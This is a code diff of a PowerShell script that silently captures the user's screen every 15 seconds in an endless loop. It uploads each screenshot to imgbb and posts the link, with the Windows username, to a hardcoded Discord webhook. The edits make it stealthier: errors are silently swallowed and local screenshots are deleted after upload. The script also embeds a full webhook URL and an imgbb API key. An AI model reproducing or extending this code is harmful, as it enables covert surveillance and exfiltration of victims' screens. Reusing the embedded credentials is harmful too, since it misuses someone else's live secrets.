@@ -1,4 +1,3 @@
-# dodododo
 function Capture-Screenshot {
     param (
         [string]$OutputFilePath
@@ -10,11 +9,14 @@ function Capture-Screenshot {
     $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $bounds.Width, $bounds.Height
     $graphics = [System.Drawing.Graphics]::FromImage($bmp)
 
-    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
-
-    $bmp.Save($OutputFilePath)
-    $graphics.Dispose()
-    $bmp.Dispose()
+    try {
+        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
+        $bmp.Save($OutputFilePath)
+    } catch {
+    } finally {
+        $graphics.Dispose()
+        $bmp.Dispose()
+    }
 }
 
 function Upload-ToImgbb {
@@ -31,11 +33,7 @@ function Upload-ToImgbb {
 
     try {
         $response = Invoke-RestMethod -Uri $url -Method Post -Body $formData
-        if ($response.success) {
-            return $response.data.url
-        } else {
-            return $null
-        }
+        return $response.success ? $response.data.url : $null
     } catch {
         return $null
     }
@@ -49,7 +47,7 @@ function Send-DiscordMessage {
     )
 
     $DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $Message = "$UserName at $DateTime $ImageUrl"
+    $Message = "$UserName at $DateTime: $ImageUrl"
 
     $payload = @{
         content = $Message
@@ -63,10 +61,7 @@ function Send-DiscordMessage {
     }
 
     $body = $payload | ConvertTo-Json -Depth 5  
-
-    $headers = @{
-        'Content-Type' = 'application/json'
-    }
+    $headers = @{'Content-Type' = 'application/json'}
 
     try {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
@@ -74,9 +69,7 @@ function Send-DiscordMessage {
     }
 }
 
-
 $discordWebhookUrl = "https://discord.com/api/webhooks/1287792562098274315/OpWPJFFOR_DP-FzhglSz6EThsVESr0fHA3LJRtSn-zxRsykRXLfcb-phlqx4zAi8ttYn"
-
 $imgbbApiKey = "21a6327cc8f24b597872c67643973fca"
 
 while ($true) {
@@ -87,7 +80,7 @@ while ($true) {
 
     if ($imageUrl) {
         Send-DiscordMessage -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
-    } else {
+        Remove-Item -Path $outputFilePath -Force
     }
 
     Start-Sleep -Seconds 15
